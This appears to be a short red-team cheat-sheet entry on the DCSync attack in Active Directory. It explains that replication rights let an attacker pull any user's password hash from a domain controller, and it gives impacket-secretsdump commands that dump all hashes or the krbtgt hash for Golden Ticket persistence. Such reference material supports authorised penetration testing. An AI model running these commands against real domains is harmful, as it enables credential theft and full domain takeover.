# 17.02 DCSync

> Replicate any user's hash from the DC with `GetChangesAll` rights — DCSyncing `krbtgt` ends the engagement.

## Overview

Accounts with GetChangesAll right (DA, Enterprise Admin, replicators) can replicate any user's hash from a DC. Game over once you DCSync krbtgt.

## Steps

- **Need replication right** — DA usually.
- **impacket-secretsdump** or Mimikatz lsadump::dcsync.
- **Dump krbtgt** for Golden Ticket persistence.

## Commands

### DCSync

```bash
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC-IP>
impacket-secretsdump -just-dc-user krbtgt <DOMAIN>/<USER>:<PASS>@<DC-IP>
```
